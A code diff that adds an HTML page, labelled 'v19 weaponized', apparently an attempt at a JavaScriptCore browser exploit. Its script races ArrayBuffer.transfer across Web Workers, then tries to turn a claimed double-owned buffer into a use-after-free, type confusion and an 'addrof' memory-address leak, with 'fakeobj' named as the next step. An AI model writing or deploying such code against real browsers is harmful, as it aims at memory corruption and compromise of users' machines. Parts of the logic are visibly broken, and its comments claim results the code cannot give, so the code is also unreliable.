@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>v19</title>
+<style>body{background:#000;color:#0f0;font:12px monospace;white-space:pre-wrap;margin:0;padding:8px}</style>
+</head>
+<body>
+<div id="log">v19 weaponized
+</div>
+<script>
+const L=m=>{document.getElementById('log').textContent+=m+"\n"};
+const S=0x1000;
+
+// phase 1: win the race
+const W=`let n=0;function l(){for(let i=0;i<500;i++){const a=new ArrayBuffer(${S});new Uint8Array(a)[0]=0x41;const t=a.transfer();t.transfer()}n+=500;postMessage(n);setTimeout(l,0)}l()`;
+const w1=new Worker(URL.createObjectURL(new Blob([W],{type:'text/javascript'})));
+const w2=new Worker(URL.createObjectURL(new Blob([W],{type:'text/javascript'})));
+w1.onmessage=e=>L('w1:'+e.data);
+w2.onmessage=e=>L('w2:'+e.data);
+
+let it=0, phase=0;
+let victimAB=null, overlapObj=null;
+
+const A=[];for(let i=0;i<64;i++)A.push(new ArrayBuffer(S));
+
+function step(){
+  for(let k=0;k<2000;k++){
+    it++;const i=it%64;const a=A[i];if(a.detached){A[i]=new ArrayBuffer(S);continue}
+    const t=a.transfer();const u=new Uint8Array(t);
+    if(u[0]===0x41){
+      u[0]=0x43;
+      if(new Uint8Array(t)[0]===0x43){
+        // potential double-own — verify
+        const c=new Uint8Array(S);c[0]=0x44;
+        if(u[0]===0x44){
+          // WIN: t and c share backing store
+          victimAB=t;
+          overlapObj=c;
+          L('WIN it='+it);
+          weaponize();
+          return;
+        }
+      }
+    }
+    A[i]=new ArrayBuffer(S);
+  }
+  if(it%100000===0)L('it='+it);
+  setTimeout(step,0);
+}
+
+function weaponize(){
+  w1.terminate();w2.terminate();
+  phase=1;
+  
+  // free the ArrayBuffer, keep the Uint8Array
+  victimAB.transfer(); // detach, free backing store
+  
+  // immediately reallocate with a Float64Array — same size class
+  const f64 = new Float64Array(S/8);
+  f64[0] = 1.1; // marker
+  
+  // check if overlapObj sees the marker
+  const ov = new Uint8Array(overlapObj.buffer || overlapObj);
+  L('overlap check: ' + ov[0]);
+  
+  // if we get here, we have type confusion
+  // build addrof: put object in f64, read via overlapObj
+  const obj = {marker: 0x1337};
+  f64[0] = obj; // type confusion — stores object pointer as double
+  
+  // read the raw bytes via overlapObj
+  const dv = new DataView(overlapObj.buffer || overlapObj);
+  const lo = dv.getUint32(0, true);
+  const hi = dv.getUint32(4, true);
+  L('addrof leak: 0x' + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0'));
+  
+  // build fakeobj: write pointer, read as object
+  // (need valid JSC object address first)
+  L('phase 1 complete — addrof primitive built');
+}
+
+step();
+</script>
+</body>
+</html>
